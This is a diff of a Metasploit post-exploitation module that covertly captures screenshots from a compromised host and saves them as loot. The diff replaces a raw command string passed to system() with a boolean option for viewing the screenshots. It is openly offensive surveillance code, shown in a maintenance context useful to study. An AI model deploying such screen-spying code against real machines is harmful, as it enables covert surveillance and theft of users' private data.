@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,11 +14,11 @@ class Metasploit3 < Msf::Post
           This module will incrementally take desktop screenshots from the host. This
         allows for screen spying which can be useful to determine if there is an active
         user on a machine, or to record the screen for later data extraction.
-        NOTES:  set VIEW_CMD to control how screenshots are opened/displayed, the file name
-        will be appended directly on to the end of the value of VIEW_CMD (use 'auto' to
-        have the module do it's best...default browser for Windows, firefox for *nix, and
-        preview app for macs).  'eog -s -f -w' is a handy VIEW_CMD for *nix.  To suppress
-        opening of screenshots all together, set the VIEW_CMD option to 'none'.
+
+        Note: As of March, 2014, the VIEW_CMD option has been removed in
+        favor of the Boolean VIEW_SCREENSHOTS option, which will control if (but
+        not how) the collected screenshots will be viewed from the Metasploit
+        interface.
         },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -36,9 +36,17 @@ class Metasploit3 < Msf::Post
       [
         OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
         OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
-        OptString.new('VIEW_CMD', [false, 'Command to use for viewing screenshots (auto, none also accepted)', 'auto']),
-        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them',false])
+        OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
+        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true])
       ], self.class)
+  end
+
+  def view_screenshots?
+    datastore['VIEW_SCREENSHOTS']
+  end
+
+  def record?
+    datastore['RECORD']
   end
 
   def run
@@ -58,25 +66,6 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    # here we check for the local platform to determine what to do when 'auto' is selected
-    if datastore['VIEW_CMD'].downcase == 'auto'
-      case ::RbConfig::CONFIG['host_os']
-      when /mac|darwin/
-        cmd = "open file://#{screenshot}" # this will use preview usually
-      when /mswin|win|mingw/
-        cmd = "start iexplore.exe \"file://#{screenshot}\""
-      when /linux|cygwin/
-        # This opens a new tab for each screenshot, but I don't see a better way
-        cmd = "firefox file://#{screenshot} &"
-      else # bsd/sun/solaris might be different, but for now...
-        cmd = "firefox file://#{screenshot} &"
-      end
-    elsif datastore['VIEW_CMD'].downcase == 'none'
-      cmd = nil
-    else
-      cmd = "#{datastore['VIEW_CMD']}#{screenshot}"
-    end
-
     begin
       count = datastore['COUNT']
       print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
@@ -92,20 +81,29 @@ class Metasploit3 < Msf::Post
           return false
         end
         if data
-          if datastore['RECORD']
+
+          if record?
             # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
             fn = "screenshot.%0#{leading_zeros}d.jpg" % num
             file_locations << store_loot("screenspy.screenshot", "image/jpg", session, data, fn, "Screenshot")
           end
 
-          # also write to disk temporarily so we can display in browser.  They may or may not have been RECORDed.
-          if cmd # do this if they have not suppressed VIEW_CMD display
+          # also write to disk temporarily so we can display in browser.
+          # They may or may not have been RECORDed.
+          # do this if they have not suppressed VIEW_SCREENSHOT display
+          if view_screenshots?
             fd = ::File.new(screenshot, 'wb')
             fd.write(data)
             fd.close
           end
+
         end
-        system(cmd) if cmd
+
+        if view_screenshots?
+          screenshot_path = "file://#{screenshot}"
+          Rex::Compat.open_browser(screenshot_path)
+        end
+
       end
     rescue IOError, Errno::ENOENT => e
       print_error("Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
@@ -115,9 +113,11 @@ class Metasploit3 < Msf::Post
     if file_locations and not file_locations.empty?
       print_status "run loot -t screenspy.screenshot to see file locations of your newly acquired loot"
     end
-    if cmd
+
+    if view_screenshots?
       # wait 2 secs so the last file can get opened before deletion
-      select(nil, nil, nil, 2)
+      sleep 2
+      vprint_status "Deleting temporary screenshot file: #{screenshot}"
       begin
         ::File.delete(screenshot)
       rescue Exception => e
@@ -125,6 +125,7 @@ class Metasploit3 < Msf::Post
         print_error("This may be due to the file being in use if you are on a Windows platform")
       end
     end
+
   end
 
   def migrate_explorer
